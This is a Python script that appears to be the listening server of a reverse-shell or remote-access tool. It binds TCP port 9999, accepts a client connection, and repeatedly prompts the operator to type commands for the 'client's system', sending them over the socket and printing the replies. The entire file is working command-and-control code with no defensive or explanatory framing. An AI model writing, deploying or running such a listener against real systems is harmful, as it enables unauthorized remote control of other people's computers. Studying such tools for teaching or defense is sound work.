import socket
import sys
host, port, s = "", 9999, socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Socket.SOCK_STREAM is for TCP connection.


def create_socket():
    try:
        global host, port, s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: {}".format(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error: {}\nRetrying...".format(msg))
        bind_socket()


def socket_accept():
    conn, address = s.accept()
    print("TCP CONNECTION HAS BEEN ESTABLISHED! |" + " IP: " + address[0] + " | PORT: " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input("ENTER THE COMMAND FOR THE CLIENT'S SYSTEM: ")
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print("CLIENT'S RESPONSE: {}".format(client_response), end="")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()


def main():
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == '__main__':
    main()